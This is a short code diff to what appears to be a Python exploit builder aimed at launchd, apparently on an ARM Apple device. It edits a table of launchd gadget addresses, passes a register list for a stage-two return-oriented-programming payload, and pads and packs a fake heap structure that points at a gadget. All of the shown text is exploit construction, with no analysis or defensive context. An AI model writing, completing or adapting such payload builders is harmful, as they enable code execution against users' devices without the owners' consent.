@@ -22,9 +22,6 @@ myreps = {
     '_audit_token_to_au32':      launchd['4'],
     '_launch_data_unpack':       launchd['5'],
     '_launch_data_dict_iterate': launchd['6'],
-
-    '_pthread_detach':           launchd['7']+4,
-    '_strlcpy':                  launchd['7']+4,
 }
 
 imports = sorted(myreps.keys())
@@ -37,11 +34,11 @@ relocs = []
 dontcare = 0
 
 import zero
-heap = zero.make_stage2(True, heapaddr)
+heap = zero.make_stage2(['R4', 'R5', 'R6', 'R7', 'PC'], True, heapaddr)
 
 assert len(heap) < 0x1654
 heap += '\0' * (0x1654 - len(heap))
-heap += struct.pack('IIII', dontcare, dontcare, heapaddr + 12, launchd['7'])
+heap += struct.pack('IIII', dontcare, dontcare, heapaddr + 0xc, launchd['7'])
 
 heapsize = len(heap)
 
